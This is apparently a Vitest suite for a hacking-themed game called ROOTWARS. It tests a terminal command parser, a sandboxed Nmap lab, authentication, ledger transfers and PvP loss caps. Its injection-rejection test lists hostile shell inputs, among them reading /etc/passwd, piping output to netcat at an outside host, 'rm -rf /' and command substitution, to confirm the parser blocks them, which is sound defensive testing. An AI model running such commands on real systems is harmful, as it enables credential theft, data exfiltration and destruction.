import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { createDatabase, DatabaseAdapter, setDb } from '../src/db/index.js';
import { createRedisClients, RedisClients, setRedis } from '../src/db/redis.js';
import { seedDatabase } from '../src/db/seed.js';
import { parseTerminalCommand } from '../src/shared/commandParser.js';
import { verifyLabNetworkIsolation } from '../src/workers/lab-runner.js';
import {
  ensureLedgerAccount,
  executeLedgerTransfer,
  getAccountBalance,
  getUserAccountId
} from '../src/server/services/ledger.js';
import { executePvpOperation } from '../src/server/services/pvp.js';
import { buildApp } from '../src/server/app.js';
import { FastifyInstance } from 'fastify';

describe('ROOTWARS Comprehensive Verification Suite', () => {
  let db: DatabaseAdapter;
  let redis: RedisClients;
  let app: FastifyInstance;

  beforeAll(async () => {
    db = await createDatabase({ pgliteDataDir: 'memory://' });
    redis = await createRedisClients();
    setDb(db);
    setRedis(redis);
    await seedDatabase(db);
    app = await buildApp({ db, redis });
    await app.ready();
  }, 30000);

  afterAll(async () => {
    await app.close();
    await redis.close();
    await db.close();
  });

  describe('1. Typed Command Parser & Ordinary vs Lab-Tool Separation', () => {
    it('separates ordinary RootWars commands from allowed lab-tool commands', () => {
      const statusCmd = parseTerminalCommand('status');
      expect(statusCmd.ok).toBe(true);
      if (statusCmd.ok) {
        expect(statusCmd.command.category).toBe('ordinary');
        expect(statusCmd.command.kind).toBe('status');
      }

      const mapCmd = parseTerminalCommand('map --region neo-cascadia');
      expect(mapCmd.ok).toBe(true);
      if (mapCmd.ok && mapCmd.command.kind === 'map') {
        expect(mapCmd.command.category).toBe('ordinary');
        expect(mapCmd.command.region).toBe('neo-cascadia');
      }

      const connectCmd = parseTerminalCommand('connect --target node-infra-ixp');
      expect(connectCmd.ok).toBe(true);
      if (connectCmd.ok && connectCmd.command.kind === 'connect') {
        expect(connectCmd.command.target).toBe('node-infra-ixp');
      }

      const labOpenCmd = parseTerminalCommand('lab open --mission msn-lab-01');
      expect(labOpenCmd.ok).toBe(true);
      if (labOpenCmd.ok && labOpenCmd.command.kind === 'lab_open') {
        expect(labOpenCmd.command.missionId).toBe('msn-lab-01');
      }

      const nmapCmd = parseTerminalCommand('nmap --profile service --target 10.240.10.10');
      expect(nmapCmd.ok).toBe(true);
      if (nmapCmd.ok && nmapCmd.command.kind === 'nmap') {
        expect(nmapCmd.command.category).toBe('lab_tool');
        expect(nmapCmd.command.profile).toBe('service');
        expect(nmapCmd.command.target).toBe('10.240.10.10');
      }
    });

    it('strictly rejects shell metacharacters and command injection attempts', () => {
      const injections = [
        'status; cat /etc/passwd',
        'nmap --profile quick | nc 1.1.1.1 4444',
        'connect --target node-infra-ixp && rm -rf /',
        'inspect --target `whoami`',
        'map --region $(id)'
      ];

      for (const raw of injections) {
        const res = parseTerminalCommand(raw);
        expect(res.ok).toBe(false);
        if (!res.ok) {
          expect(res.error.code).toBe('SHELL_METACHARACTER_REJECTED');
        }
      }
    });
  });

  describe('2. Allowed Tool Arguments & Lab Target Allowlist', () => {
    it('rejects unapproved Nmap profiles, scripts, file outputs, and raw flags', () => {
      const badArgs = [
        'nmap --profile aggressive-exploit',
        'nmap --script vuln',
        'nmap --profile service -oN /tmp/scan.txt',
        'nmap --profile quick -sC',
        'nmap --profile service --spoof-mac 0'
      ];

      for (const raw of badArgs) {
        const res = parseTerminalCommand(raw);
        expect(res.ok).toBe(false);
        if (!res.ok) {
          expect(res.error.code).toBe('DISALLOWED_TOOL_ARGUMENT');
        }
      }
    });

    it('rejects public internet IPs, localhost, and non-lab private subnets', () => {
      const forbiddenTargets = [
        'nmap --profile quick --target 1.1.1.1',
        'nmap --profile service --target 8.8.8.8',
        'nmap --profile service --target 127.0.0.1',
        'nmap --profile service --target 192.168.1.1',
        'nmap --profile service --target 172.16.1.1',
        'nmap --profile service --target scanme.nmap.org'
      ];

      for (const raw of forbiddenTargets) {
        const res = parseTerminalCommand(raw);
        expect(res.ok).toBe(false);
        if (!res.ok) {
          expect(res.error.code).toBe('UNAUTHORIZED_LAB_TARGET');
        }
      }
    });
  });

  describe('3. Isolated Lab Worker & Real Nmap Execution Verification', () => {
    it('proves lab worker runs as non-root (65534), blocks internet/host loopback, and scans assigned lab target', async () => {
      const report = await verifyLabNetworkIsolation();
      expect(report.netnsCreated).toBe(true);
      expect(report.effectiveUid).toBe(65534);
      expect(report.effectiveGid).toBe(65534);
      expect(report.publicInternetBlocked).toBe(true);
      expect(report.hostLoopbackIsolated).toBe(true);
      expect(report.assignedLabTargetReachable).toBe(true);
      expect(report.discoveredAssignedPorts).toEqual([22, 80]);
    }, 20000);
  });

  describe('4. Authentication, Session Authorization & End-to-End Lab Mission Flow', () => {
    let operatorToken = '';
    let operatorId = '';

    it('blocks unauthenticated access to protected endpoints', async () => {
      const meRes = await app.inject({ method: 'GET', url: '/api/auth/me' });
      expect(meRes.statusCode).toBe(401);

      const termRes = await app.inject({
        method: 'POST',
        url: '/api/terminal/exec',
        payload: { command: 'status' }
      });
      expect(termRes.statusCode).toBe(401);
    });

    it('registers a new operator, provisions home node and 2,500 RWC starting balance', async () => {
      const regRes = await app.inject({
        method: 'POST',
        url: '/api/auth/register',
        payload: {
          username: 'vega_sec',
          password: 'StrongPassword!2026'
        }
      });

      expect(regRes.statusCode).toBe(201);
      const body = regRes.json();
      expect(body.token).toBeTruthy();
      expect(body.operator.username).toBe('vega_sec');
      expect(body.operator.balanceRwc).toBe(2500);
      expect(body.operator.shieldActive).toBe(true);

      operatorToken = body.token;
      operatorId = body.operator.id;
    });

    it('completes an isolated Lab Mission using real Nmap and credits reward atomically', async () => {
      // 1. Accept mission LAB-01
      const acceptRes = await app.inject({
        method: 'POST',
        url: '/api/terminal/exec',
        headers: { authorization: `Bearer ${operatorToken}` },
        payload: { command: 'accept --job msn-lab-01' }
      });
      expect(acceptRes.statusCode).toBe(200);
      expect(acceptRes.json().ok).toBe(true);

      // 2. Open isolated lab for msn-lab-01 (target 10.240.10.10)
      const openRes = await app.inject({
        method: 'POST',
        url: '/api/terminal/exec',
        headers: { authorization: `Bearer ${operatorToken}` },
        payload: { command: 'lab open --mission msn-lab-01' }
      });
      expect(openRes.statusCode).toBe(200);
      expect(openRes.json().ok).toBe(true);

      // 3. Verify scanning a DIFFERENT lab target IP (10.240.20.15) is rejected & audited
      const wrongTargetRes = await app.inject({
        method: 'POST',
        url: '/api/terminal/exec',
        headers: { authorization: `Bearer ${operatorToken}` },
        payload: { command: 'nmap --profile service --target 10.240.20.15' }
      });
      expect(wrongTargetRes.json().ok).toBe(false);
      expect(wrongTargetRes.json().lines.join(' ')).toContain('UNAUTHORIZED_LAB_TARGET');

      // 4. Execute approved Nmap scan against assigned target 10.240.10.10
      const scanRes = await app.inject({
        method: 'POST',
        url: '/api/terminal/exec',
        headers: { authorization: `Bearer ${operatorToken}` },
        payload: { command: 'nmap --profile service --target 10.240.10.10' }
      });
      const scanBody = scanRes.json();
      expect(scanBody.ok).toBe(true);
      expect(scanBody.missionCompleted).toBeDefined();
      expect(scanBody.missionCompleted.code).toBe('LAB-01');
      expect(scanBody.missionCompleted.rewardRwc).toBe(1200);
      expect(scanBody.operator.balanceRwc).toBe(2500 + 1200);
    }, 20000);

    it('revokes session on logout and denies subsequent requests', async () => {
      const loginRes = await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        payload: {
          username: 'vega_sec',
          password: 'StrongPassword!2026'
        }
      });
      const tempToken = loginRes.json().token;

      const logoutRes = await app.inject({
        method: 'POST',
        url: '/api/auth/logout',
        headers: { authorization: `Bearer ${tempToken}` }
      });
      expect(logoutRes.statusCode).toBe(200);

      const afterRes = await app.inject({
        method: 'GET',
        url: '/api/auth/me',
        headers: { authorization: `Bearer ${tempToken}` }
      });
      expect(afterRes.statusCode).toBe(401);
    });
  });

  describe('5. Transactional Ledger: Atomicity, Idempotency & Concurrent Race Protection', () => {
    it('enforces idempotency so duplicate idempotencyKeys never double-transfer', async () => {
      const senderAcc = getUserAccountId('usr-nyx-zero');
      const receiverAcc = getUserAccountId('usr-kestrel-9');

      const beforeSender = await getAccountBalance(db, senderAcc);
      const beforeReceiver = await getAccountBalance(db, receiverAcc);

      const key = `test-idempotent-key-${Date.now()}`;
      const tx1 = await executeLedgerTransfer(db, {
        idempotencyKey: key,
        fromAccountId: senderAcc,
        toAccountId: receiverAcc,
        amount: 300,
        txType: 'player_transfer',
        memo: 'Idempotency test'
      });
      expect(tx1.idempotentReplay).toBe(false);

      const tx2 = await executeLedgerTransfer(db, {
        idempotencyKey: key,
        fromAccountId: senderAcc,
        toAccountId: receiverAcc,
        amount: 300,
        txType: 'player_transfer',
        memo: 'Idempotency test replay'
      });
      expect(tx2.idempotentReplay).toBe(true);
      expect(tx2.id).toBe(tx1.id);

      const afterSender = await getAccountBalance(db, senderAcc);
      const afterReceiver = await getAccountBalance(db, receiverAcc);
      expect(afterSender).toBe(beforeSender - 300);
      expect(afterReceiver).toBe(beforeReceiver + 300);
    });

    it('prevents overdrafts and race conditions under 15 concurrent parallel transfers', async () => {
      const raceSenderId = 'acct-user-race-sender';
      const raceReceiverId = 'acct-user-race-receiver';
      await ensureLedgerAccount(db, raceSenderId, 'user', 'race-sender', 1000);
      await ensureLedgerAccount(db, raceReceiverId, 'user', 'race-receiver', 0);

      // Launch 15 concurrent transfers of 200 RWC each from an account with 1,000 RWC.
      // Exactly 5 must succeed and 10 must fail with INSUFFICIENT_FUNDS.
      const attempts = Array.from({ length: 15 }, (_, i) =>
        executeLedgerTransfer(db, {
          idempotencyKey: `race-tx-${Date.now()}-${i}`,
          fromAccountId: raceSenderId,
          toAccountId: raceReceiverId,
          amount: 200,
          txType: 'player_transfer',
          memo: `Concurrent transfer #${i}`
        })
      );

      const results = await Promise.allSettled(attempts);
      const fulfilled = results.filter((r) => r.status === 'fulfilled');
      const rejected = results.filter((r) => r.status === 'rejected');

      expect(fulfilled.length).toBe(5);
      expect(rejected.length).toBe(10);

      const finalSender = await getAccountBalance(db, raceSenderId);
      const finalReceiver = await getAccountBalance(db, raceReceiverId);
      expect(finalSender).toBe(0);
      expect(finalReceiver).toBe(1000);
    });
  });

  describe('6. Open PvP Loss Caps, Protected Floor, Cooldowns & New-Player Shield', () => {
    it('blocks PvP attacks against operators with active New-Player Shield', async () => {
      // Register a fresh shielded user
      const shieldedRes = await app.inject({
        method: 'POST',
        url: '/api/auth/register',
        payload: { username: 'rookie_shield', password: 'Password!123' }
      });
      const rookieNodeId = shieldedRes.json().operator.homeNode.id;

      await expect(
        executePvpOperation(db, {
          attackerUserId: 'usr-nyx-zero',
          targetNodeIdentifier: rookieNodeId,
          method: 'heist',
          bypassCooldownForTest: true
        })
      ).rejects.toThrow(/New-Player Shield/);
    });

    it('enforces per-attack loss cap (10%), 24h cumulative loss cap (20%), and 500 RWC minimum protected floor', async () => {
      // Lower target node security so heist succeeds deterministically
      await db.query(
        `UPDATE network_nodes
         SET security_level = 10, patch_level = 10,
             defense_config = '{"monitoring":1,"patching":1,"segmentation":1,"decoys":0,"incident_response":1,"recovery":1}'::jsonb
         WHERE id = 'node-pvp-cipher'`
      );

      // Set defender cipher_wolf balance to exactly 2,000 RWC
      const defenderAcc = getUserAccountId('usr-cipher-wolf');
      await db.query(`UPDATE ledger_accounts SET balance = 2000 WHERE id = $1`, [defenderAcc]);
      await db.query(`DELETE FROM pvp_incidents WHERE defender_user_id = 'usr-cipher-wolf'`);

      // Attack 1: 10% per-attack cap of 2,000 RWC => max 200 RWC stolen
      const atk1 = await executePvpOperation(db, {
        attackerUserId: 'usr-vortex-prime',
        targetNodeIdentifier: 'node-pvp-cipher',
        method: 'heist',
        bypassCooldownForTest: true
      });
      expect(atk1.outcome).toBe('success');
      expect(atk1.rwcStolen).toBeLessThanOrEqual(200);
      expect(atk1.rwcStolen).toBeGreaterThan(0);

      // Attack 2 & Attack 3: 24h cumulative loss cap is 20% of 2,000 = 400 RWC total.
      await executePvpOperation(db, {
        attackerUserId: 'usr-vortex-prime',
        targetNodeIdentifier: 'node-pvp-cipher',
        method: 'heist',
        bypassCooldownForTest: true
      });
      await executePvpOperation(db, {
        attackerUserId: 'usr-vortex-prime',
        targetNodeIdentifier: 'node-pvp-cipher',
        method: 'heist',
        bypassCooldownForTest: true
      });

      const balanceAfterDailyCap = await getAccountBalance(db, defenderAcc);
      // Total lost in 24h cannot exceed 20% of 2,000 (400 RWC), so balance must be >= 1,600 RWC
      expect(balanceAfterDailyCap).toBeGreaterThanOrEqual(1600);

      // Now test minimum protected floor (500 RWC): set balance to 520 RWC and clear incident history
      await db.query(`UPDATE ledger_accounts SET balance = 520 WHERE id = $1`, [defenderAcc]);
      await db.query(`DELETE FROM pvp_incidents WHERE defender_user_id = 'usr-cipher-wolf'`);

      const floorAtk = await executePvpOperation(db, {
        attackerUserId: 'usr-vortex-prime',
        targetNodeIdentifier: 'node-pvp-cipher',
        method: 'heist',
        bypassCooldownForTest: true
      });
      const finalFloorBal = await getAccountBalance(db, defenderAcc);
      expect(finalFloorBal).toBeGreaterThanOrEqual(500);
      expect(floorAtk.rwcStolen).toBeLessThanOrEqual(20);
    });

    it('enforces attacker cooldown when launching back-to-back PvP operations', async () => {
      await expect(
        executePvpOperation(db, {
          attackerUserId: 'usr-vortex-prime',
          targetNodeIdentifier: 'node-pvp-cipher',
          method: 'probe',
          bypassCooldownForTest: false
        })
      ).rejects.toThrow(/cooling down|post-incident/);
    });
  });
});
